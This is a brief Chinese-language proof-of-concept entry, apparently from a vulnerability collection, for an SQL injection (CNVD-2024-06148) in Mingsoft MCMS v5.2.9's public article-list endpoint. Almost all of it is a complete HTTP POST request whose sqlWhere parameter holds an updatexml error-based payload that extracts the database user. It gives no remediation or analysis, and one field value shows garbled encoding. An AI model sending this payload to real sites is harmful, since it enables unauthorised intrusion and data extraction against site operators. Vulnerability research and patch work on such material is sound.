 ## Mingsoft-MCMS前台查询文章列表接口SQL注入(CNVD-2024-06148)

## 版本
```
 v5.2.9
```

## poc
```
POST /cms/content/list.do HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Connection: close
Content-Length: 326
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

categoryType=1&sqlWhere=%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2c(SELECT%20%20current_user)%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22æç« æ é¢%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d&pageNo=1&pageSize=10
```
